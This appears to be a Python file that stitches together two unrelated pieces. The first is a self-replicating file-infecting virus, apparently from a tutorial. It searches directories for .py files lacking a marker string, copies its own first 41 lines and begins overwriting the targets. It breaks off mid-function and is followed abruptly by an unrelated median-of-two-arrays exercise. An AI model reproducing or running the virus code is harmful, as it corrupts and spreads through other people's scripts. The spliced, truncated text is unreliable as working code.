#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program for the above approach
def Solution(arr):
 
    n = len(arr)
 
    # If length of array is even
    if n % 2 == 0:
        z = n // 2
        e = arr[z]
        q = arr[z - 1]
        ans = (e + q) / 2
        return ans
         
    # If length of array is odd
    else:
        z = n // 2
        ans = arr[z]
        return ans
 
# Driver code
if __name__ == "__main__":
     
    arr1 = [ -5, 3, 6, 12, 15 ]
    arr2 = [ -12, -10, -6, -3, 4, 10 ]
 
    # Concatenating the two arrays
    arr3 = arr1 + arr2
 
    # Sorting the resultant array
    arr3.sort()
 
    print("Median = ", Solution(arr3))
     
# This code is contributed by kush11
# Time Complexity: O((n + m)Log(m+n))
# Space Complexity: O(n + m) Since we are creating a new array size of n+m